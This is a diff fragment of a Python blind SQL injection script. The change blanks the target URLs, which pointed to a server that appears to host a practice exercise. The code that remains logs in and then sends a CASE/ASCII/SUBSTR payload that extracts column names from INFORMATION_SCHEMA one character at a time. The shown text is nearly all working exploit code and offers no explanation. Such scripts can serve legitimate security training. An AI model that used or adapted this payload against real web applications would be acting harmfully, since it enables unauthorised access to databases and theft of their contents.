@@ -8,7 +8,7 @@ age_ = '8'
 email_ = '123'
 
 def doCheckInjectionResult():	# 
-    LOGIN_URL = "http://keeplink.kr:10105/web_basic_ok.php"
+    LOGIN_URL = ""
     data_q = {'id':id_, 'pw':pw_}
     res = req.post(LOGIN_URL, data=data_q)
 #    print res.text
@@ -26,7 +26,7 @@ def doCheckInjectionResult():	#
         raw_input('continue?')
 
 def doBlindSqli(idx):
-    EDIT_URL = "http://keeplink.kr:10105/web_basic_edit_ok.php"
+    EDIT_URL = ""
     before = ''
     for i in range(32, 127, 1): # printable ascii
         sex_ = "(select case ascii(substr((select column_name from INFORMATION_SCHEMA.COLUMNS where table_name=0x4b4559424f58 limit 1), {}, 1)) when {} then 1 else 2 end)".format(idx, i)
